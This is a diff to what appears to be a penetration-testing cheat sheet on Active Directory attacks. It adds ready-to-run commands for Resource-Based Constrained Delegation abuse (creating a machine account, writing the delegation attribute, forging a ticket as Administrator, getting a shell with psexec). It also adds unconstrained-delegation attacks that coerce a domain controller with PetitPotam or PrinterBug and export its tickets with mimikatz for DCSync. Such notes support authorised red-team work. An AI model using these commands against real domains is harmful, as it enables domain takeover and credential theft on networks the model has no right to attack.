@@ -86,6 +86,72 @@ $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Tem
 
 ---
 
+## Resource-Based Constrained Delegation (RBCD)
+
+If you can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer (typical when you have GenericAll / GenericWrite on the computer object, or control any account in a group with that right), you can impersonate any user — including Domain Admins — to that computer.
+
+### Requirements
+
+- A computer you control (existing or freshly created via MAQ)
+- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the victim computer
+
+### Create a computer account (if MAQ > 0)
+
+Most domains allow any authenticated user to create up to 10 computer accounts (`ms-DS-MachineAccountQuota` default).
+
+```bash
+impacket-addcomputer example.com/<user>:'<pass>' -computer-name 'ATTACKER$' -computer-pass 'ComputerP@ss1' -dc-ip 10.10.10.10
+```
+
+### Set RBCD on the victim
+
+```bash
+impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+```
+
+### Abuse via S4U2Self + S4U2Proxy
+
+```bash
+impacket-getST -spn cifs/victim.example.com -impersonate Administrator -dc-ip 10.10.10.10 example.com/'ATTACKER$':'ComputerP@ss1'
+```
+
+That drops `Administrator.ccache`. Use it:
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass victim.example.com
+```
+
+---
+
+## Unconstrained Delegation + Coerce
+
+Any computer with unconstrained delegation caches TGTs of every user who authenticates to it. Coerce a DC (or high-value user) to authenticate, then extract the TGT.
+
+```powershell
+# Find unconstrained delegation targets
+Get-DomainComputer -Unconstrained | Select-Object dnshostname
+```
+
+Coerce the DC with PetitPotam / PrinterBug:
+
+```bash
+impacket-petitpotam <unconstrained-host> 10.10.10.10     # DC authenticates to your host
+# Or via printnightmare
+dementor.py -d example.com -u <user> -p '<pass>' <unconstrained-host> 10.10.10.10
+```
+
+On the unconstrained host, extract the DC's TGT:
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+Use the DC's ticket to DCSync.
+
+---
+
 ## NTLM Relay
 
 If you capture NTLMv2 hashes via Responder and SMB signing is disabled on targets, relay them directly rather than cracking:
